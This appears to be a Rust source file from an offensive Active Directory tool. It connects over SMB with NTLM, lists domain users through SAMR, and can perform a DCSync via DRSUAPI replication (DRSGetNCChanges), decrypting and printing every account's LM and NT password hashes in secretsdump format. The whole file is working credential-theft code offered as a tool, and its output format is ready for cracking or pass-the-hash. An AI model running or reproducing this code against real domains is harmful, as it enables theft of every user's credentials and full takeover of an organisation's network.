use std::collections::BTreeMap;

use ipkt::ntlm::Credentials;
use ipkt::rpc::{
    domain_to_dn, parse_drs_bind_response, parse_drs_crack_names, parse_drs_dc_info_ntds_guid,
    parse_get_nc_changes_reply, parse_samr_connect_response, parse_samr_enumerate_users,
    samr_connect_request, samr_enumerate_users_request, DrsUserSecret, DrsUsnVector, EXOP_REPL_OBJ,
};
use ipkt::smb::{SmbClient, SmbRpcTransport};


pub struct ReplExportOptions {
    pub host: String,
    pub port: u16,
    pub domain: String,
    pub user: String,
    pub password: String,
    
    pub try_drsu: bool,
    
    pub target_user: Option<String>,
}


pub async fn run_repl_export(opts: ReplExportOptions) -> Result<(), Box<dyn std::error::Error>> {
    let mut client = SmbClient::connect(&opts.host, opts.port).await?;
    client
        .authenticate_ntlm(Credentials::new(&opts.domain, &opts.user, &opts.password))
        .await?;
    println!("[*] Connected to {}:{}", opts.host, opts.port);

    let session_key = client
        .session_keys()
        .map(|k| k.exported_session_key)
        .ok_or("no NTLM session key (KEY_EXCH required for DRS decrypt)")?;

    let mut transport = SmbRpcTransport::connect_samr(&mut client, &opts.host).await?;
    transport.bind_samr(&mut client).await?;
    let connect_resp = client
        .pipe_transact(
            transport.file_id(),
            samr_connect_request(None, 0x000F003F).pack(),
        )
        .await?;
    let server = parse_samr_connect_response(&connect_resp)
        .ok_or("SamrConnect failed to parse")?;
    if server.status != 0 {
        println!("[!] SamrConnect status={:#x}", server.status);
    } else {
        println!("[+] SamrConnect OK");
    }

    let enum_resp = client
        .pipe_transact(
            transport.file_id(),
            samr_enumerate_users_request(&server.server_handle, 0, 1024).pack(),
        )
        .await?;
    let users = parse_samr_enumerate_users(&enum_resp);
    println!("[*] SAMR users (MVP parse): {}", users.len());
    for u in &users {
        println!("    {} (RID {})", u.name, u.rid);
    }

    if opts.try_drsu {
        run_dcsync(
            &mut client,
            &opts.host,
            &opts.domain,
            &session_key,
            opts.target_user.as_deref(),
        )
        .await?;
    } else {
        println!("[*] Pass --drsu for DRSUAPI replication (DCSync path)");
    }

    Ok(())
}

async fn run_dcsync(
    client: &mut SmbClient,
    host: &str,
    domain: &str,
    session_key: &[u8; 16],
    target_user: Option<&str>,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut drsu = SmbRpcTransport::connect_drsu(client, host).await?;
    let bind_resp = drsu.drs_bind(client).await?;
    let bind = parse_drs_bind_response(&bind_resp).ok_or("DRSBind response parse failed")?;
    if bind.status != 0 {
        return Err(format!("DRSBind status={:#x}", bind.status).into());
    }
    println!("[+] DRSBind OK");

    let dc_resp = drsu
        .drs_domain_controller_info(client, &bind.handle, domain)
        .await?;
    let dsa_guid = parse_drs_dc_info_ntds_guid(&dc_resp).unwrap_or([0u8; 16]);
    if dsa_guid == [0u8; 16] {
        println!("[!] Could not parse NtdsDsaObjectGuid; using NULL GUID");
    }

    let nc_dn = if let Some(user) = target_user {
        let cracked = crack_user_dn(&mut drsu, client, &bind.handle, domain, user).await?;
        println!("[*] Target user NC fragment: {cracked}");
        cracked
    } else {
        domain_to_dn(domain)
    };

    let extended_op = if target_user.is_some() {
        EXOP_REPL_OBJ
    } else {
        0
    };
    let c_max = if target_user.is_some() { 1 } else { 1000 };

    let mut all_secrets: BTreeMap<u32, DrsUserSecret> = BTreeMap::new();
    let mut page = 0u32;
    let mut usnvec: Option<DrsUsnVector> = None;
    let mut invocation_id = dsa_guid;
    loop {
        println!("[*] DRSGetNCChanges NC={nc_dn} (page {page})");
        let chg_resp = drsu
            .drs_get_nc_changes(
                client,
                &bind.handle,
                dsa_guid,
                invocation_id,
                &nc_dn,
                c_max,
                extended_op,
                usnvec,
            )
            .await?;
        let reply = parse_get_nc_changes_reply(&chg_resp, session_key);
        if !reply.pek_list.is_empty() {
            println!("    pek_keys={}", reply.pek_list.len());
        }
        if let Some(u) = reply.usnvec {
            println!(
                "    usn obj={} prop={}",
                u.usn_high_obj_update, u.usn_high_prop_update
            );
            usnvec = Some(u);
        }
        if let Some(inv) = reply.invocation_id {
            invocation_id = inv;
        }
        println!(
            "    objects={} more_data={} secrets={}",
            reply.num_objects,
            reply.more_data,
            reply.secrets.len()
        );
        for s in reply.secrets {
            merge_secret(&mut all_secrets, s);
        }
        if !reply.more_data || target_user.is_some() {
            break;
        }
        page += 1;
        if page >= 32 {
            println!("[!] Stopping after 32 replication pages (MVP limit)");
            break;
        }
    }

    if all_secrets.is_empty() {
        println!("[!] No hashes parsed — check DA rights and NDR/layout");
        return Ok(());
    }
    print_secrets(domain, &all_secrets);
    Ok(())
}

async fn crack_user_dn(
    drsu: &mut SmbRpcTransport,
    client: &mut SmbClient,
    handle: &[u8; 20],
    domain: &str,
    user: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let account = if user.contains('\\') || user.contains('/') {
        user.replace('/', "\\")
    } else {
        format!("{domain}\\{user}")
    };
    let resp = drsu.drs_crack_names(client, handle, &account).await?;
    let cracked = parse_drs_crack_names(&resp).ok_or("DRSCrackNames parse failed")?;
    if cracked.status != 0 {
        return Err(format!("DRSCrackNames status={:#x}", cracked.status).into());
    }
    Ok(cracked.name.trim_end_matches('\0').to_string())
}

fn merge_secret(map: &mut BTreeMap<u32, DrsUserSecret>, user: DrsUserSecret) {
    if user.rid == 0 {
        return;
    }
    map.entry(user.rid)
        .and_modify(|e| {
            if user.nt_hash.is_some() {
                e.nt_hash = user.nt_hash;
            }
            if user.lm_hash.is_some() {
                e.lm_hash = user.lm_hash;
            }
            if e.username.is_empty() && !user.username.is_empty() {
                e.username = user.username.clone();
            }
        })
        .or_insert(user);
}

fn print_secrets(domain: &str, secrets: &BTreeMap<u32, DrsUserSecret>) {
    println!("[*] DRSUAPI credentials (domain\\user:RID:LM:NT:::)");
    for s in secrets.values() {
        let user = if s.username.is_empty() {
            format!("RID-{}", s.rid)
        } else {
            s.username.clone()
        };
        let lm = s
            .lm_hash
            .map(hex::encode)
            .unwrap_or_else(|| "aad3b435b51404eeaad3b435b51404ee".into());
        let nt = s
            .nt_hash
            .map(hex::encode)
            .unwrap_or_else(|| "31d6cfe0d16ae931b73c59d7e0c089c0".into());
        println!("{domain}\\{user}:{}:{lm}:{nt}:::", s.rid);
    }
}
